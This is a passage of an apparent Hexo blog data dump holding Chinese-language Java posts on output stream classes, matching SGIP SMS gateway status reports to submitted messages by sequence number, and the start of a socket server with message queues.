public abstract void write(int b)</span><br><span class=\"line\">    //将数组内的字符写入</span><br><span class=\"line\">    public void write(byte b[])</span><br><span class=\"line\">    //将数组内特定部分字符写入</span><br><span class=\"line\">    public void write(byte b[], int off, int len)</span><br><span class=\"line\">    //刷新</span><br><span class=\"line\">    public void flush()</span><br><span class=\"line\">    //关闭</span><br><span class=\"line\">    public void close()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>FileOutputStream:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class FileOutputStream extends OutputStream&#123;</span><br><span class=\"line\">    //构造器</span><br><span class=\"line\">    public FileOutputStream(String name)</span><br><span class=\"line\">    public FileOutputStream(String name, boolean append)</span><br><span class=\"line\">    public FileOutputStream(File file)</span><br><span class=\"line\">    public FileOutputStream(File file, boolean append)</span><br><span class=\"line\">    public FileOutputStream(FileDescriptor fdObj)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>BufferdOutputStream:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class BufferedOutputStream extends FilterOutputStream &#123;</span><br><span class=\"line\">    //构造器</span><br><span class=\"line\">    public BufferedOutputStream(OutputStream out)</span><br><span class=\"line\">    public BufferedOutputStream(OutputStream out, int size)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"三-实际例子\"><a href=\"#三-实际例子\" class=\"headerlink\" title=\"三.实际例子\"></a>三.实际例子</h3><p>读取socket发送过来的字节流</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.客户端发过来的字节流 socket.getInputStream()</span><br><span class=\"line\">//2.字节流转为字符流 InputStreamReader()</span><br><span class=\"line\">//3.高效读写 BufferedReader()</span><br><span class=\"line\">BufferedReader in = new BufferedReader(new InputStreamReader(</span><br><span class=\"line\">socket.getInputStream()));</span><br><span class=\"line\">System.out.println(in.readLine());  // 打印</span><br></pre></td></tr></table></figure>\n<h3 id=\"四-区别\"><a href=\"#四-区别\" class=\"headerlink\" title=\"四.区别\"></a>四.区别</h3><p><a href=\"https://comp.lang.java.help.narkive.com/dKrnNGj0/what-s-the-diff-printwriter-vs-outputstreamwriter\" target=\"_blank\" rel=\"noopener\">https://comp.lang.java.help.narkive.com/dKrnNGj0/what-s-the-diff-printwriter-vs-outputstreamwriter</a></p>\n"},{"title":"sgip网关问题","date":"2018-09-04T20:49:30.000Z","_content":"\n###### 问题:\n在联通SGIP网关中，Submit发送消息后，怎么将返回的REPORT与之关联起来。\n\n###### Submit内容\n```\nCommandId*\t命令ID，十六进制数字\nSequenceNumber\t序列号，十六进制数字\nSPNumber\tSP的接入号码，字符\nChargeNumber\t付费号码，字符，手机号码前加“86”国别标志；当且仅当群发且对用户收费时为空；如果为空，则该条短消息产生的费用由UserNumber代表的用户支付；如果为全零字符串“000000000000000000000”，表示该条短消息产生的费用由SP支付。\nUserNumber\t一个或多个接收该短消息的手机号，手机号之间用逗号(,)隔开，字符，手机号码前加“86”国别标志，如8613001125453,8613001132345\nCorpId\t企业代码，取值范围0-99999，字符\nServiceType\t业务代码，由SP定义，字符\nFeeType*\t计费类型，字符\nFeeValue\t取值范围0-99999，该条短消息的收费值，单位为分，由SP定义，字符\n对于包月制收费的用户，该值为月租费的值\nGivenValue\t取值范围0-99999，赠送用户的话费，单位为分，由SP定义，特指由SP向用户发送广告时的赠送话费，字符\nAgentFlag\t代收费标志，0：应收；1：实收，字符\nMorelatetoMTFlag\t引起MT消息的原因\n0-MO点播引起的第一条MT消息；\n1-MO点播引起的非第一条MT消息；\n2-非MO点播引起的MT消息；\n3-系统反馈引起的MT消息。\n字符\nPriority\t优先级0-9从低到高，默认为0，十六进制数字\nExpireTime\t短消息寿命的终止时间，如果为空，表示使用短消息中心的缺省值。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间\nScheduleTime\t短消息定时发送的时间，如果为空，表示立刻发送该短消息。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间\nReportFlag\t状态报告标记\n0-该条消息只有最后出错时要返回状态报告\n1-该条消息无论最后是否成功都要返回状态报告\n2-该条消息不需要返回状态报告\n3-该条消息仅携带包月计费信息，不下发给用户，要返回状态报告\n其它-保留\n缺省设置为0，十六进制数字\nMessageType\t信息类型：\n0-短消息信息\n其它：待定\n\n十六进制数字\nTP_pid\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.9\n十六进制数字\nTP_udhi\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.23,仅使用1位，右对齐\n十六进制数字\nMessageCoding\t短消息的编码格式。\n0：纯ASCII字符串\n3：写卡操作\n4：二进制编码\n8：UCS2编码\n15：GBK编码\n其它参见GSM3.38第4节：SMS Data Coding Scheme\n十六进制数字\nMessageContent\t短消息的内容，十六进制数字\nReserve\t保留，扩展用\n```\n###### REPORT内容\n```\nCommandId\t命令ID，十六进制数字\nSequenceNumber\t序列号，十六进制数字\nSubmitSequenceNumber\t该命令所涉及的Submit或deliver命令的序列号，十六进制数字\nReportType\tReport命令类型\n0：对先前一条Submit命令的状态报告\n1：对先前一条前转Deliver命令的状态报告，十六进制数字\nUserNumber\t接收该短消息的手机号，字符，手机号码前加“86”国别标志\nState*\t该命令所涉及的短消息的当前执行状态\n0：发送成功\n1：等待发送\n2：发送失败\n十六进制数字\nErrorCode\t当State=2时为错误码值，否则为0，十六进制数字\nReserve\t保留，扩展用\n```\n###### 观察\n  请求时，返回：\n  ![REPORT1](./report1.jpg)\n  后台输出REPORT:\n  ![REPORT2](./report2.jpg)\n\n  通过对比发现其中有某两个字段相同，ok,到这基本搞定。\n\n###### 解决\n1.在Submit时，将SequenceNumber存储\n```\n//将seq与spNumber存储 SequenceNumber为 seq1+seq2+seq3\nSubmitReportMapEntity submitReportMapEntity = new SubmitReportMapEntity();\nsubmitReportMapEntity.setSeq1(String.valueOf(submit.getSeqno_1()));\nsubmitReportMapEntity.setSeq2(String.valueOf(submit.getSeqno_2()));\nsubmitReportMapEntity.setSeq3(String.valueOf(submit.getSeqno_3()));\nsubmitReportMapEntity.setSpNumber(String.valueOf(submit.getSPNumber()));\nlogService.storeSubmitReportMap(submitReportMapEntity);\n```\n2.Report时通过SequenceNumber获取SP(外显号)\n```\nString spNumber_temp = new String();\nspNumber_temp = logService.submitReportMapInquiry(String.valueOf(report.getSeq_2()),String.valueOf(report.getSeq_3()));\n```\n","source":"_posts/java/sgip/sgip.md","raw":"---\ntitle: sgip网关问题\ndate: 2018-09-04 16:49:30\ntags: [java,protocol]\n---\n\n###### 问题:\n在联通SGIP网关中，Submit发送消息后，怎么将返回的REPORT与之关联起来。\n\n###### Submit内容\n```\nCommandId*\t命令ID，十六进制数字\nSequenceNumber\t序列号，十六进制数字\nSPNumber\tSP的接入号码，字符\nChargeNumber\t付费号码，字符，手机号码前加“86”国别标志；当且仅当群发且对用户收费时为空；如果为空，则该条短消息产生的费用由UserNumber代表的用户支付；如果为全零字符串“000000000000000000000”，表示该条短消息产生的费用由SP支付。\nUserNumber\t一个或多个接收该短消息的手机号，手机号之间用逗号(,)隔开，字符，手机号码前加“86”国别标志，如8613001125453,8613001132345\nCorpId\t企业代码，取值范围0-99999，字符\nServiceType\t业务代码，由SP定义，字符\nFeeType*\t计费类型，字符\nFeeValue\t取值范围0-99999，该条短消息的收费值，单位为分，由SP定义，字符\n对于包月制收费的用户，该值为月租费的值\nGivenValue\t取值范围0-99999，赠送用户的话费，单位为分，由SP定义，特指由SP向用户发送广告时的赠送话费，字符\nAgentFlag\t代收费标志，0：应收；1：实收，字符\nMorelatetoMTFlag\t引起MT消息的原因\n0-MO点播引起的第一条MT消息；\n1-MO点播引起的非第一条MT消息；\n2-非MO点播引起的MT消息；\n3-系统反馈引起的MT消息。\n字符\nPriority\t优先级0-9从低到高，默认为0，十六进制数字\nExpireTime\t短消息寿命的终止时间，如果为空，表示使用短消息中心的缺省值。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间\nScheduleTime\t短消息定时发送的时间，如果为空，表示立刻发送该短消息。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间\nReportFlag\t状态报告标记\n0-该条消息只有最后出错时要返回状态报告\n1-该条消息无论最后是否成功都要返回状态报告\n2-该条消息不需要返回状态报告\n3-该条消息仅携带包月计费信息，不下发给用户，要返回状态报告\n其它-保留\n缺省设置为0，十六进制数字\nMessageType\t信息类型：\n0-短消息信息\n其它：待定\n\n十六进制数字\nTP_pid\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.9\n十六进制数字\nTP_udhi\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.23,仅使用1位，右对齐\n十六进制数字\nMessageCoding\t短消息的编码格式。\n0：纯ASCII字符串\n3：写卡操作\n4：二进制编码\n8：UCS2编码\n15：GBK编码\n其它参见GSM3.38第4节：SMS Data Coding Scheme\n十六进制数字\nMessageContent\t短消息的内容，十六进制数字\nReserve\t保留，扩展用\n```\n###### REPORT内容\n```\nCommandId\t命令ID，十六进制数字\nSequenceNumber\t序列号，十六进制数字\nSubmitSequenceNumber\t该命令所涉及的Submit或deliver命令的序列号，十六进制数字\nReportType\tReport命令类型\n0：对先前一条Submit命令的状态报告\n1：对先前一条前转Deliver命令的状态报告，十六进制数字\nUserNumber\t接收该短消息的手机号，字符，手机号码前加“86”国别标志\nState*\t该命令所涉及的短消息的当前执行状态\n0：发送成功\n1：等待发送\n2：发送失败\n十六进制数字\nErrorCode\t当State=2时为错误码值，否则为0，十六进制数字\nReserve\t保留，扩展用\n```\n###### 观察\n  请求时，返回：\n  ![REPORT1](./report1.jpg)\n  后台输出REPORT:\n  ![REPORT2](./report2.jpg)\n\n  通过对比发现其中有某两个字段相同，ok,到这基本搞定。\n\n###### 解决\n1.在Submit时，将SequenceNumber存储\n```\n//将seq与spNumber存储 SequenceNumber为 seq1+seq2+seq3\nSubmitReportMapEntity submitReportMapEntity = new SubmitReportMapEntity();\nsubmitReportMapEntity.setSeq1(String.valueOf(submit.getSeqno_1()));\nsubmitReportMapEntity.setSeq2(String.valueOf(submit.getSeqno_2()));\nsubmitReportMapEntity.setSeq3(String.valueOf(submit.getSeqno_3()));\nsubmitReportMapEntity.setSpNumber(String.valueOf(submit.getSPNumber()));\nlogService.storeSubmitReportMap(submitReportMapEntity);\n```\n2.Report时通过SequenceNumber获取SP(外显号)\n```\nString spNumber_temp = new String();\nspNumber_temp = logService.submitReportMapInquiry(String.valueOf(report.getSeq_2()),String.valueOf(report.getSeq_3()));\n```\n","slug":"java/sgip/sgip","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ll004c6dcpk8ksfqoe","content":"<h6 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题:\"></a>问题:</h6><p>在联通SGIP网关中，Submit发送消息后，怎么将返回的REPORT与之关联起来。</p>\n<h6 id=\"Submit内容\"><a href=\"#Submit内容\" class=\"headerlink\" title=\"Submit内容\"></a>Submit内容</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CommandId*\t命令ID，十六进制数字</span><br><span class=\"line\">SequenceNumber\t序列号，十六进制数字</span><br><span class=\"line\">SPNumber\tSP的接入号码，字符</span><br><span class=\"line\">ChargeNumber\t付费号码，字符，手机号码前加“86”国别标志；当且仅当群发且对用户收费时为空；如果为空，则该条短消息产生的费用由UserNumber代表的用户支付；如果为全零字符串“000000000000000000000”，表示该条短消息产生的费用由SP支付。</span><br><span class=\"line\">UserNumber\t一个或多个接收该短消息的手机号，手机号之间用逗号(,)隔开，字符，手机号码前加“86”国别标志，如8613001125453,8613001132345</span><br><span class=\"line\">CorpId\t企业代码，取值范围0-99999，字符</span><br><span class=\"line\">ServiceType\t业务代码，由SP定义，字符</span><br><span class=\"line\">FeeType*\t计费类型，字符</span><br><span class=\"line\">FeeValue\t取值范围0-99999，该条短消息的收费值，单位为分，由SP定义，字符</span><br><span class=\"line\">对于包月制收费的用户，该值为月租费的值</span><br><span class=\"line\">GivenValue\t取值范围0-99999，赠送用户的话费，单位为分，由SP定义，特指由SP向用户发送广告时的赠送话费，字符</span><br><span class=\"line\">AgentFlag\t代收费标志，0：应收；1：实收，字符</span><br><span class=\"line\">MorelatetoMTFlag\t引起MT消息的原因</span><br><span class=\"line\">0-MO点播引起的第一条MT消息；</span><br><span class=\"line\">1-MO点播引起的非第一条MT消息；</span><br><span class=\"line\">2-非MO点播引起的MT消息；</span><br><span class=\"line\">3-系统反馈引起的MT消息。</span><br><span class=\"line\">字符</span><br><span class=\"line\">Priority\t优先级0-9从低到高，默认为0，十六进制数字</span><br><span class=\"line\">ExpireTime\t短消息寿命的终止时间，如果为空，表示使用短消息中心的缺省值。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间</span><br><span class=\"line\">ScheduleTime\t短消息定时发送的时间，如果为空，表示立刻发送该短消息。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间</span><br><span class=\"line\">ReportFlag\t状态报告标记</span><br><span class=\"line\">0-该条消息只有最后出错时要返回状态报告</span><br><span class=\"line\">1-该条消息无论最后是否成功都要返回状态报告</span><br><span class=\"line\">2-该条消息不需要返回状态报告</span><br><span class=\"line\">3-该条消息仅携带包月计费信息，不下发给用户，要返回状态报告</span><br><span class=\"line\">其它-保留</span><br><span class=\"line\">缺省设置为0，十六进制数字</span><br><span class=\"line\">MessageType\t信息类型：</span><br><span class=\"line\">0-短消息信息</span><br><span class=\"line\">其它：待定</span><br><span class=\"line\"></span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">TP_pid\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.9</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">TP_udhi\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.23,仅使用1位，右对齐</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">MessageCoding\t短消息的编码格式。</span><br><span class=\"line\">0：纯ASCII字符串</span><br><span class=\"line\">3：写卡操作</span><br><span class=\"line\">4：二进制编码</span><br><span class=\"line\">8：UCS2编码</span><br><span class=\"line\">15：GBK编码</span><br><span class=\"line\">其它参见GSM3.38第4节：SMS Data Coding Scheme</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">MessageContent\t短消息的内容，十六进制数字</span><br><span class=\"line\">Reserve\t保留，扩展用</span><br></pre></td></tr></table></figure>\n<h6 id=\"REPORT内容\"><a href=\"#REPORT内容\" class=\"headerlink\" title=\"REPORT内容\"></a>REPORT内容</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CommandId\t命令ID，十六进制数字</span><br><span class=\"line\">SequenceNumber\t序列号，十六进制数字</span><br><span class=\"line\">SubmitSequenceNumber\t该命令所涉及的Submit或deliver命令的序列号，十六进制数字</span><br><span class=\"line\">ReportType\tReport命令类型</span><br><span class=\"line\">0：对先前一条Submit命令的状态报告</span><br><span class=\"line\">1：对先前一条前转Deliver命令的状态报告，十六进制数字</span><br><span class=\"line\">UserNumber\t接收该短消息的手机号，字符，手机号码前加“86”国别标志</span><br><span class=\"line\">State*\t该命令所涉及的短消息的当前执行状态</span><br><span class=\"line\">0：发送成功</span><br><span class=\"line\">1：等待发送</span><br><span class=\"line\">2：发送失败</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">ErrorCode\t当State=2时为错误码值，否则为0，十六进制数字</span><br><span class=\"line\">Reserve\t保留，扩展用</span><br></pre></td></tr></table></figure>\n<h6 id=\"观察\"><a href=\"#观察\" class=\"headerlink\" title=\"观察\"></a>观察</h6><p>  请求时，返回：<br>  <img src=\"./report1.jpg\" alt=\"REPORT1\"><br>  后台输出REPORT:<br>  <img src=\"./report2.jpg\" alt=\"REPORT2\"></p>\n<p>  通过对比发现其中有某两个字段相同，ok,到这基本搞定。</p>\n<h6 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h6><p>1.在Submit时，将SequenceNumber存储<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//将seq与spNumber存储 SequenceNumber为 seq1+seq2+seq3</span><br><span class=\"line\">SubmitReportMapEntity submitReportMapEntity = new SubmitReportMapEntity();</span><br><span class=\"line\">submitReportMapEntity.setSeq1(String.valueOf(submit.getSeqno_1()));</span><br><span class=\"line\">submitReportMapEntity.setSeq2(String.valueOf(submit.getSeqno_2()));</span><br><span class=\"line\">submitReportMapEntity.setSeq3(String.valueOf(submit.getSeqno_3()));</span><br><span class=\"line\">submitReportMapEntity.setSpNumber(String.valueOf(submit.getSPNumber()));</span><br><span class=\"line\">logService.storeSubmitReportMap(submitReportMapEntity);</span><br></pre></td></tr></table></figure></p>\n<p>2.Report时通过SequenceNumber获取SP(外显号)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String spNumber_temp = new String();</span><br><span class=\"line\">spNumber_temp = logService.submitReportMapInquiry(String.valueOf(report.getSeq_2()),String.valueOf(report.getSeq_3()));</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h6 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题:\"></a>问题:</h6><p>在联通SGIP网关中，Submit发送消息后，怎么将返回的REPORT与之关联起来。</p>\n<h6 id=\"Submit内容\"><a href=\"#Submit内容\" class=\"headerlink\" title=\"Submit内容\"></a>Submit内容</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CommandId*\t命令ID，十六进制数字</span><br><span class=\"line\">SequenceNumber\t序列号，十六进制数字</span><br><span class=\"line\">SPNumber\tSP的接入号码，字符</span><br><span class=\"line\">ChargeNumber\t付费号码，字符，手机号码前加“86”国别标志；当且仅当群发且对用户收费时为空；如果为空，则该条短消息产生的费用由UserNumber代表的用户支付；如果为全零字符串“000000000000000000000”，表示该条短消息产生的费用由SP支付。</span><br><span class=\"line\">UserNumber\t一个或多个接收该短消息的手机号，手机号之间用逗号(,)隔开，字符，手机号码前加“86”国别标志，如8613001125453,8613001132345</span><br><span class=\"line\">CorpId\t企业代码，取值范围0-99999，字符</span><br><span class=\"line\">ServiceType\t业务代码，由SP定义，字符</span><br><span class=\"line\">FeeType*\t计费类型，字符</span><br><span class=\"line\">FeeValue\t取值范围0-99999，该条短消息的收费值，单位为分，由SP定义，字符</span><br><span class=\"line\">对于包月制收费的用户，该值为月租费的值</span><br><span class=\"line\">GivenValue\t取值范围0-99999，赠送用户的话费，单位为分，由SP定义，特指由SP向用户发送广告时的赠送话费，字符</span><br><span class=\"line\">AgentFlag\t代收费标志，0：应收；1：实收，字符</span><br><span class=\"line\">MorelatetoMTFlag\t引起MT消息的原因</span><br><span class=\"line\">0-MO点播引起的第一条MT消息；</span><br><span class=\"line\">1-MO点播引起的非第一条MT消息；</span><br><span class=\"line\">2-非MO点播引起的MT消息；</span><br><span class=\"line\">3-系统反馈引起的MT消息。</span><br><span class=\"line\">字符</span><br><span class=\"line\">Priority\t优先级0-9从低到高，默认为0，十六进制数字</span><br><span class=\"line\">ExpireTime\t短消息寿命的终止时间，如果为空，表示使用短消息中心的缺省值。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间</span><br><span class=\"line\">ScheduleTime\t短消息定时发送的时间，如果为空，表示立刻发送该短消息。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间</span><br><span class=\"line\">ReportFlag\t状态报告标记</span><br><span class=\"line\">0-该条消息只有最后出错时要返回状态报告</span><br><span class=\"line\">1-该条消息无论最后是否成功都要返回状态报告</span><br><span class=\"line\">2-该条消息不需要返回状态报告</span><br><span class=\"line\">3-该条消息仅携带包月计费信息，不下发给用户，要返回状态报告</span><br><span class=\"line\">其它-保留</span><br><span class=\"line\">缺省设置为0，十六进制数字</span><br><span class=\"line\">MessageType\t信息类型：</span><br><span class=\"line\">0-短消息信息</span><br><span class=\"line\">其它：待定</span><br><span class=\"line\"></span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">TP_pid\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.9</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">TP_udhi\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.23,仅使用1位，右对齐</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">MessageCoding\t短消息的编码格式。</span><br><span class=\"line\">0：纯ASCII字符串</span><br><span class=\"line\">3：写卡操作</span><br><span class=\"line\">4：二进制编码</span><br><span class=\"line\">8：UCS2编码</span><br><span class=\"line\">15：GBK编码</span><br><span class=\"line\">其它参见GSM3.38第4节：SMS Data Coding Scheme</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">MessageContent\t短消息的内容，十六进制数字</span><br><span class=\"line\">Reserve\t保留，扩展用</span><br></pre></td></tr></table></figure>\n<h6 id=\"REPORT内容\"><a href=\"#REPORT内容\" class=\"headerlink\" title=\"REPORT内容\"></a>REPORT内容</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CommandId\t命令ID，十六进制数字</span><br><span class=\"line\">SequenceNumber\t序列号，十六进制数字</span><br><span class=\"line\">SubmitSequenceNumber\t该命令所涉及的Submit或deliver命令的序列号，十六进制数字</span><br><span class=\"line\">ReportType\tReport命令类型</span><br><span class=\"line\">0：对先前一条Submit命令的状态报告</span><br><span class=\"line\">1：对先前一条前转Deliver命令的状态报告，十六进制数字</span><br><span class=\"line\">UserNumber\t接收该短消息的手机号，字符，手机号码前加“86”国别标志</span><br><span class=\"line\">State*\t该命令所涉及的短消息的当前执行状态</span><br><span class=\"line\">0：发送成功</span><br><span class=\"line\">1：等待发送</span><br><span class=\"line\">2：发送失败</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">ErrorCode\t当State=2时为错误码值，否则为0，十六进制数字</span><br><span class=\"line\">Reserve\t保留，扩展用</span><br></pre></td></tr></table></figure>\n<h6 id=\"观察\"><a href=\"#观察\" class=\"headerlink\" title=\"观察\"></a>观察</h6><p>  请求时，返回：<br>  <img src=\"./report1.jpg\" alt=\"REPORT1\"><br>  后台输出REPORT:<br>  <img src=\"./report2.jpg\" alt=\"REPORT2\"></p>\n<p>  通过对比发现其中有某两个字段相同，ok,到这基本搞定。</p>\n<h6 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h6><p>1.在Submit时，将SequenceNumber存储<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//将seq与spNumber存储 SequenceNumber为 seq1+seq2+seq3</span><br><span class=\"line\">SubmitReportMapEntity submitReportMapEntity = new SubmitReportMapEntity();</span><br><span class=\"line\">submitReportMapEntity.setSeq1(String.valueOf(submit.getSeqno_1()));</span><br><span class=\"line\">submitReportMapEntity.setSeq2(String.valueOf(submit.getSeqno_2()));</span><br><span class=\"line\">submitReportMapEntity.setSeq3(String.valueOf(submit.getSeqno_3()));</span><br><span class=\"line\">submitReportMapEntity.setSpNumber(String.valueOf(submit.getSPNumber()));</span><br><span class=\"line\">logService.storeSubmitReportMap(submitReportMapEntity);</span><br></pre></td></tr></table></figure></p>\n<p>2.Report时通过SequenceNumber获取SP(外显号)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String spNumber_temp = new String();</span><br><span class=\"line\">spNumber_temp = logService.submitReportMapInquiry(String.valueOf(report.getSeq_2()),String.valueOf(report.getSeq_3()));</span><br></pre></td></tr></table></figure></p>\n"},{"title":"socket","date":"2018-09-26T21:49:23.000Z","_content":"\n#### 1.java.net.socket\nserver端代码，使用子线程处理连接.\n###### (1)存储消息的队列\n使用两个队列InMsgQueue和OutMsgueue来存储输入输出数据。\n```\n/**\n *客户端返回数据队列\n */\npublic class InMsgQueue {\n    /**\n     * 阻塞队列，存储返回的数据\n     */\n    private Map<String, LinkedBlockingQueue<String>> ins ;\n\n\n    private static final InMsgQueue instance = new InMsgQueue();\n\n    private InMsgQueue(){\n        ins =  new HashMap<String, LinkedBlockingQueue<String>>();\n    }\n\n    public static final InMsgQueue getInstance(){\n        return instance;\n    }\n\n    public Map<String, LinkedBlockingQueue<String>> getDatas(){\n        return this.ins;\n    }\n\n}\n\n```\nOutMsgQueue:\n```\n/**\n * 维护要执行的命令\n */\npublic class OutMsgQueue {\n\n    /**\n     * 阻塞队列，存储页面输入的命令\n     */\n    private Map<String, LinkedBlockingQueue<String>> outs 